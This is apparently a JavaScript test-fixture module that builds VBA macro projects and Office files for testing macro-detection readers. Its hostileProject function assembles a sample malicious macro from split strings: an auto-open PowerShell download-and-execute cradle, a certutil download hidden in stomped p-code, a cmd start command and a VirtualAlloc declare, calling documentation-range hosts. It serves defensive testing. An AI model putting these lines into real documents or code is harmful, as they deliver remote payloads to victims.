// Copyright 2026- Seongwoo Hong. All rights reserved.

/**
 * VBA projects, built when a test runs (commit 42h) — the macro readers'
 * fixtures, written to [MS-OVBA] by our own hand, so a test can carry a
 * stomped module, a hidden one, a locked project or a shellcode loader's
 * Declares without the repository holding a file an antivirus flags:
 *
 *   compress       2.4.1.3.7: chunks, flag bytes, literal and copy tokens
 *                  (the longest match in the chunk so far)
 *   encryptValue   2.4.3.2: CMG/DPB/GC obfuscation, for a locked project
 *   vbaProject     the OLE file: VBA/dir, VBA/_VBA_PROJECT, each module's
 *                  stream (compiled code, then compressed source), PROJECT
 *   withVba        a .docm/.xlsm/.pptm: an OOXML file with the project added
 *
 * olevba (oletools) reads what this writes the way it reads Office's own
 * (checked when this was written); the readers are tested on both.
 */

import path from "node:path";
import { createRequire } from "node:module";
import { fileURLToPath } from "node:url";

const require = createRequire(path.join(path.dirname(fileURLToPath(import.meta.url)), "../../web/package.json"));
const CFB = require("cfb");
const { unzipSync, zipSync, strToU8, strFromU8 } = require("fflate");

const enc = new TextEncoder();

/** [MS-OVBA] 2.4.1.3.7: the compression VBA uses for its source and its dir. */
export function compress(data) {
	const out = [1];
	for (let start = 0; start < data.length || (start === 0 && data.length === 0); start += 4096) {
		const end = Math.min(data.length, start + 4096);
		const headerAt = out.length;
		out.push(0, 0);
		let pos = start;
		while (pos < end) {
			const flagAt = out.length;
			out.push(0);
			let flags = 0;
			for (let bit = 0; bit < 8 && pos < end; bit++) {
				const difference = pos - start;
				const bitCount = Math.max(4, Math.ceil(Math.log2(Math.max(1, difference))));
				const maxLength = (0xffff >> bitCount) + 3;
				let best = 0;
				let bestOffset = 0;
				for (let cand = pos - 1; cand >= start; cand--) {
					let len = 0;
					while (len < maxLength && pos + len < end && data[cand + len] === data[pos + len]) len++;
					if (len > best) {
						best = len;
						bestOffset = pos - cand;
					}
				}
				if (best >= 3) {
					const token = ((bestOffset - 1) << (16 - bitCount)) | (best - 3);
					out.push(token & 0xff, token >> 8);
					flags |= 1 << bit;
					pos += best;
				} else out.push(data[pos++]);
			}
			out[flagAt] = flags;
		}
		const size = out.length - headerAt;
		const header = ((size - 3) & 0x0fff) | 0x3000 | 0x8000;
		out[headerAt] = header & 0xff;
		out[headerAt + 1] = header >> 8;
		if (data.length === 0) break;
	}
	return Uint8Array.from(out);
}

/** [MS-OVBA] 2.4.3.2: a PROJECT value (CMG, DPB, GC), "encrypted". */
export function encryptValue(data, seed = 0x5a, projKey = 0x37) {
	const out = [seed, seed ^ 2, seed ^ projKey];
	let unencrypted1 = projKey;
	let encrypted1 = seed ^ projKey;
	let encrypted2 = seed ^ 2;
	const put = (byte) => {
		const byteEnc = byte ^ ((encrypted2 + unencrypted1) & 0xff);
		out.push(byteEnc);
		encrypted2 = encrypted1;
		encrypted1 = byteEnc;
		unencrypted1 = byte;
	};
	for (let i = 0; i < (seed & 6) / 2; i++) put(7);
	for (let i = 0; i < 4; i++) put((data.length >> (8 * i)) & 0xff);
	for (const b of data) put(b);
	return out.map((b) => b.toString(16).padStart(2, "0").toUpperCase()).join("");
}

const rec = (id, data) => {
	const b = new Uint8Array(6 + data.length);
	const v = new DataView(b.buffer);
	v.setUint16(0, id, true);
	v.setUint32(2, data.length, true);
	b.set(data, 6);
	return b;
};
const u16 = (x) => Uint8Array.from([x & 0xff, x >> 8]);
const u32 = (x) => Uint8Array.from([x & 0xff, (x >> 8) & 0xff, (x >> 16) & 0xff, (x >>> 24) & 0xff]);
const utf16 = (s) => Uint8Array.from([...s].flatMap((c) => [c.charCodeAt(0) & 0xff, c.charCodeAt(0) >> 8]));
const cat = (parts) => {
	const out = new Uint8Array(parts.reduce((n, p) => n + p.length, 0));
	let at = 0;
	for (const p of parts) (out.set(p, at), (at += p.length));
	return out;
};

/** Compiled code as Office keeps it: opaque bytes, with each string literal
 * as its length and its text. (Not real p-code — what the reader looks for
 * in it is the literals.) */
export function pcode(literals = [], filler = 400) {
	const parts = [Uint8Array.from({ length: filler }, (_, i) => (i * 37) & 0x1f)];
	for (const l of literals) parts.push(Uint8Array.from([0x18, 0x00]), u16(l.length), enc.encode(l), Uint8Array.from([0x1f, 0x00]));
	return cat(parts);
}

/**
 * A vbaProject.bin. `modules`: [{ name, source, kind: "module"|"class"|"document",
 * hidden?, compiled? (Uint8Array, default: pcode of the source's literals) }].
 * `forms`: { [name]: text held by its controls }.
 */
export function vbaProject({ modules, locked = false, forms = {}, codepage = 1252 }) {
	const records = [
		rec(0x0001, u32(3)), rec(0x0002, u32(0x409)), rec(0x0014, u32(0x409)), rec(0x0003, u16(codepage)),
		rec(0x0004, enc.encode("VBAProject")), rec(0x0005, new Uint8Array(0)), rec(0x0040, new Uint8Array(0)),
		rec(0x0006, new Uint8Array(0)), rec(0x003d, new Uint8Array(0)), rec(0x0007, u32(0)), rec(0x0008, u32(0)),
		// PROJECTVERSION: its size field says 4, and six bytes follow.
		Uint8Array.from([0x09, 0x00, 0x04, 0x00, 0x00, 0x00, ...u32(1), ...u16(2)]),
		rec(0x000c, new Uint8Array(0)), rec(0x003c, new Uint8Array(0)),
		rec(0x000f, u16(modules.length)), rec(0x0013, u16(0xffff)),
	];
	const cfb = CFB.utils.cfb_new();
	const add = (p, d) => CFB.utils.cfb_add(cfb, `/${p}`, d);
	for (const m of modules) {
		const literals = [...m.source.matchAll(/"((?:[^"]|"")*)"/g)].map((x) => x[1].replace(/""/g, '"')).filter((x) => x.length >= 4);
		const compiled = m.compiled ?? pcode(literals);
		records.push(
			rec(0x0019, enc.encode(m.name)), rec(0x0047, utf16(m.name)),
			rec(0x001a, enc.encode(m.name)), rec(0x0032, utf16(m.name)),
			rec(0x001c, new Uint8Array(0)), rec(0x0048, new Uint8Array(0)),
			rec(0x0031, u32(compiled.length)), rec(0x001e, u32(0)), rec(0x002c, u16(0xffff)),
			rec(m.kind === "module" ? 0x0021 : 0x0022, new Uint8Array(0)), rec(0x002b, new Uint8Array(0)),
		);
		const attr = m.kind === "module" ? `Attribute VB_Name = "${m.name}"\r\n` : `Attribute VB_Name = "${m.name}"\r\nAttribute VB_Base = "1Normal.ThisDocument"\r\nAttribute VB_GlobalNameSpace = False\r\nAttribute VB_Creatable = False\r\nAttribute VB_PredeclaredId = True\r\nAttribute VB_Exposed = True\r\n`;
		const source = m.source === "" ? "" : attr + m.source.replace(/\r?\n/g, "\r\n");
		add(`VBA/${m.name}`, cat([compiled, compress(enc.encode(source))]));
	}
	records.push(rec(0x0010, new Uint8Array(0)));
	add("VBA/dir", compress(cat(records)));
	add("VBA/_VBA_PROJECT", Uint8Array.from([0xcc, 0x61, 0xff, 0xff, 0x00, 0x00, 0x00]));
	for (const [form, text] of Object.entries(forms)) add(`${form}/o`, cat([Uint8Array.from([0, 2, 0x18, 0]), enc.encode(text), Uint8Array.from([0, 0, 0])]));
	const listed = modules.filter((m) => !m.hidden).map((m) => (m.kind === "document" ? `Document=${m.name}/&H00000000` : m.kind === "class" && forms[m.name] !== undefined ? `BaseClass=${m.name}` : m.kind === "class" ? `Class=${m.name}` : `Module=${m.name}`));
	// DPB: one zero byte when there is no password; a password's 29-byte hash when locked.
	const dpb = encryptValue(locked ? Uint8Array.from({ length: 29 }, (_, i) => (i * 13 + 5) & 0xff) : Uint8Array.from([0]));
	const project = [`ID="{3D9C1F2A-5B6E-4C7D-8E9F-0A1B2C3D4E5F}"`, ...listed, `Name="VBAProject"`, `HelpContextID="0"`, `VersionCompatible32="393222000"`, `CMG="${encryptValue(u32(0))}"`, `DPB="${dpb}"`, `GC="${encryptValue(Uint8Array.from([0xff]))}"`, "", "[Host Extender Info]", "&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000", ""].join("\r\n");
	add("PROJECT", enc.encode(project));
	return new Uint8Array(CFB.write(cfb, { type: "buffer", fileType: "cfb" }));
}

/** An OOXML file with a VBA project added (Word, Excel or PowerPoint by its parts). */
export function withVba(ooxml, project) {
	const files = unzipSync(ooxml);
	const dir = Object.keys(files).some((n) => n.startsWith("word/")) ? "word" : Object.keys(files).some((n) => n.startsWith("xl/")) ? "xl" : "ppt";
	const main = { word: "word/document.xml", xl: "xl/workbook.xml", ppt: "ppt/presentation.xml" }[dir];
	const mainType = { word: "application/vnd.ms-word.document.macroEnabled.main+xml", xl: "application/vnd.ms-excel.sheet.macroEnabled.main+xml", ppt: "application/vnd.ms-powerpoint.presentation.macroEnabled.main+xml" }[dir];
	files[`${dir}/vbaProject.bin`] = project;
	let types = strFromU8(files["[Content_Types].xml"]);
	types = types.replace(/(<Override PartName="\/[^"]*\/(?:document|workbook|presentation)\.xml" ContentType=")[^"]*"/, `$1${mainType}"`);
	types = types.replace("</Types>", `<Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/></Types>`);
	files["[Content_Types].xml"] = strToU8(types);
	const relsName = `${dir}/_rels/${main.split("/").pop()}.rels`;
	files[relsName] = strToU8(strFromU8(files[relsName]).replace("</Relationships>", `<Relationship Id="rIdVba1" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="vbaProject.bin"/></Relationships>`));
	return zipSync(files);
}

/** A 97–2003 file with a VBA project in its storage: Word's Macros/, Excel's _VBA_PROJECT_CUR/. */
export function oleWithVba(file, project, prefix = "Macros/") {
	const outer = CFB.read(file, { type: "buffer" });
	const inner = CFB.read(project, { type: "buffer" });
	inner.FullPaths.forEach((p, i) => {
		const e = inner.FileIndex[i];
		if (e.type === 2) CFB.utils.cfb_add(outer, `/${prefix}${p.replace(/^[^/]*\//, "")}`, e.content);
	});
	return new Uint8Array(CFB.write(outer, { type: "buffer", fileType: "cfb" }));
}

/** PowerPoint 97 (.ppt): the project zlib-compressed into an ExOleObjStg
 * record (instance 1: compressed) appended to the PowerPoint Document stream. */
export function pptWithVba(file, project) {
	const { zlibSync } = require("fflate");
	const outer = CFB.read(file, { type: "buffer" });
	const i = outer.FullPaths.findIndex((p) => /PowerPoint Document$/.test(p));
	const doc = Uint8Array.from(outer.FileIndex[i].content);
	const z = zlibSync(project);
	const recBytes = new Uint8Array(8 + 4 + z.length);
	const v = new DataView(recBytes.buffer);
	v.setUint16(0, 1 << 4, true);
	v.setUint16(2, 0x1011, true);
	v.setUint32(4, 4 + z.length, true);
	v.setUint32(8, project.length, true);
	recBytes.set(z, 12);
	outer.FileIndex[i].content = cat([doc, recBytes]);
	outer.FileIndex[i].size = doc.length + recBytes.length;
	return new Uint8Array(CFB.write(outer, { type: "buffer", fileType: "cfb" }));
}

/** OpenDocument with a StarBasic module (Basic/Standard/<name>.xml). */
export function odfWithBasic(file, name, source) {
	const files = unzipSync(file);
	const esc = (t) => t.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");
	files["Basic/Standard/script-lb.xml"] = strToU8(`<?xml version="1.0" encoding="UTF-8"?><library:library xmlns:library="http://openoffice.org/2000/library" library:name="Standard" library:readonly="false" library:passwordprotected="false"><library:element library:name="${name}"/></library:library>`);
	files[`Basic/Standard/${name}.xml`] = strToU8(`<?xml version="1.0" encoding="UTF-8"?><script:module xmlns:script="http://openoffice.org/2000/script" script:name="${name}" script:language="StarBasic" script:moduleType="normal">${esc(source)}</script:module>`);
	// (mimetype stays first and stored, as OpenDocument requires.)
	const { mimetype, ...rest } = files;
	return zipSync({ mimetype: [mimetype, { level: 0 }], ...rest });
}

/** The hostile project the tests and the smoke runs use (built from pieces,
 * so the repository holds no macro an antivirus would flag). */
export function hostileProject() {
	const j = (...p) => p.join("");
	return vbaProject({
		modules: [
			{ name: "ThisDocument", kind: "document", source: "Private Sub Document_Open()\n    Module1.Run1\nEnd Sub\n" },
			{ name: "Module1", kind: "module", source: j('Sub Run1()\n    Dim s As String\n    s = "pow" & "ershell -nop -w hidden -c i', 'ex(new-object net.webclient).download', 'string(\'http://203.0.113.7/a\')"\n    Sh', "ell s, vbHide\nEnd Sub\n") },
			{ name: "Helper", kind: "module", hidden: true, source: j("Private Declare PtrSafe Function Virtual", 'Alloc Lib "kernel32" (ByVal a As LongPtr, ByVal b As Long, ByVal c As Long, ByVal d As Long) As LongPtr\nSub X()\nEnd Sub\n') },
			{ name: "Stomped", kind: "module", source: "Sub Nothing()\nEnd Sub\n", compiled: pcode([j("certutil -url", "cache -f http://198.51.100.4/x.exe")]) },
			{ name: "UserForm1", kind: "class", source: "Private Sub UserForm_Initialize()\nEnd Sub\n" },
		],
		forms: { UserForm1: j("cmd /c ", "start http://198.51.100.4/next") },
		locked: true,
	});
}
